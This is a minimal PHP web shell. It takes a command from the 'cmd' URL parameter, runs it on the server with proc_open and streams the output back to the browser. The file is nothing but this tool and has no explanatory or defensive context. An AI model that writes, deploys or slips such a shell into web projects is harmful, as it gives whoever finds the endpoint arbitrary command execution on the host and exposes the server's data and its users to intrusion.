<?php
if (isset($_GET['cmd'])) {
    $exe_command = $_GET['cmd'];
    
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w") 
    );
    
    $process = proc_open($exe_command, $descriptorspec, $pipes);
    
    if (is_resource($process))
    {
    
        while( ! feof($pipes[1]))
        {
            $return_message = fgets($pipes[1], 1024);
            if (strlen($return_message) == 0) break;
    
            echo $return_message.'<br />';
            ob_flush();
            flush();
        }
    }
}
?>
